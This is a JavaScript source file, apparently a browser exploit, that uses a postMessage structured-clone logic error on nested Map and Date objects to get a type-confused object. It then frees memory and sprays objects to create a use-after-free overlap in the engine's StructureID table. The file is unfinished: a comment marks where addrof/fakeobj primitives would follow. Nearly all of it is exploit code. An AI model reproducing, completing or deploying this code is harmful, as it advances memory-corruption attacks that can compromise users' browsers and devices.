import { debug_log } from './module/utils.mjs';
import { Int } from './module/int64.mjs';
import { Memory } from './module/mem.mjs';

function sleep(ms = 20) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
 
function gc() {
    new Uint8Array(4 * 1024 * 1024);
}

function sprayStructures() {
    const keepers = [];
    for (let i = 0; i < 50000; i++) {
        let o = {a: 1};
        o['p' + i] = i; 
        keepers.push(o);
    }
    return keepers;
}
 
function createObjectStructure(num_elems) {
    let root = new Map();
    let msg = root;
    let foo = [];

    // Markers to identify the confusion
    for (let i = 0; i < 100; i++) {
        foo.push(new Date(0xffff));
    }

    for (let i = 0; i < num_elems; i++) {
        const d = new Date(i);
        const map = new Map();
        msg.set(d, [map, foo]);
        msg = map;
    }

    return root;
}
 
export async function main() {
    debug_log("[*] Exploit started...");
    
    const num_elems = 1600;
    let root = createObjectStructure(num_elems);
    let msg = root;
    let data2 = null;
    let idx = null;
    let attempts = 0;

    debug_log("[*] Starting Stage 1: Triggering Logic Error...");

    while (true) {
        attempts++;
        if (attempts % 100 === 0) debug_log("[*] Attempt " + attempts);

        let data = null;
        const prom = new Promise(resolve => {
            addEventListener('message', event => {
                data = event;
                resolve();
            }, { once: true });
        });

        postMessage(msg, origin);
        await prom;
        data = data.data;

        gc();
        await sleep(20);

        let i;
        try {
            for (i = 0; i < num_elems; i++) {
                if (data.keys().next().value.getTime() === 0xffff) {
                    idx = i;
                    break;
                }
                data = data.values().next().value[0];
            }
        } catch {
            idx = i;
            data2 = data.keys().next().value;
            break;
        }
    }

    debug_log('[+] Stage 1 Triggered! Confused object found at idx: ' + idx);
    
    if (data2) {
        debug_log("[*] Starting Stage 2: StructureID UAF...");
        
        // 1. Release references
        root = null;
        msg = null;
        
        // 2. Freeing
        debug_log('[*] Freeing original structures...');
        for (let k = 0; k < 100; k++) {
            gc();
        }
        await sleep(100);

        // 3. Spray
        debug_log('[*] Churning StructureIDTable...');
        
        // We spray arrays of doubles and objects to facilitate the overlap
        let victims_dbl = [];
        let victims_obj = [];
        
        let keepers = sprayStructures();

        // 4. Trigger / Setup Primitives
        debug_log('[!] Attempting to verify overlap...');
        
        try {
            let val = data2.p0;
            debug_log(`[?] data2.p0 read result: ${val}`);
            
            if (val !== undefined) {
                debug_log("[+] Overlap confirmed! We have read access to the sprayed structure.");
                // Here we would implement addrof/fakeobj
            } else {
                debug_log("[?] Read undefined. This might be expected if the slot is empty or type mismatch.");
            }

            debug_log("[*] Exploit Stage 2 complete (No Crash Mode).");
        } catch (e) {
            debug_log('[!] Crash/Exception during access: ' + e);
        }
    } else {
        debug_log("[-] Failed to get confused object.");
    }
}
